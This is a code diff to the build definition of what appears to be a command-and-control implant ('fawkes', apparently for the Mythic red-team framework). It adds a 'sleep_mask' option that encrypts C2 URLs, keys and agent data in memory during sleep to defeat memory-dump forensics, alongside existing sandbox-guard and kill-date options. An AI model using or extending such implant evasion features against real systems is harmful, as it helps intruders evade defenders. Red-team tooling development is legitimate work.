@@ -227,6 +227,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
 		{
+			Name:          "sleep_mask",
+			Description:   "Encrypt sensitive agent and C2 data in memory during sleep cycles. Uses AES-256-GCM with a random per-cycle key. Process memory dumps during sleep only reveal encrypted blobs — not C2 URLs, encryption keys, or UUIDs. C2 profile fields are only masked when no tasks are actively running.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
+		{
 			Name:          "kill_date",
 			Description:   "Optional: UTC date/time after which the agent will self-terminate (format: YYYY-MM-DD or YYYY-MM-DD HH:MM). Leave empty for no kill date. Enforced every tasking cycle.",
 			Required:      false,
@@ -431,6 +438,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if sbGuard, err := payloadBuildMsg.BuildParameters.GetBooleanArg("sandbox_guard"); err == nil && sbGuard {
 		ldflags += fmt.Sprintf(" -X '%s.sandboxGuard=true'", fawkes_main_package)
+	}
+	if slpMask, err := payloadBuildMsg.BuildParameters.GetBooleanArg("sleep_mask"); err == nil && slpMask {
+		ldflags += fmt.Sprintf(" -X '%s.sleepMask=true'", fawkes_main_package)
 	}
 
 	// Kill date: parse date string to Unix timestamp
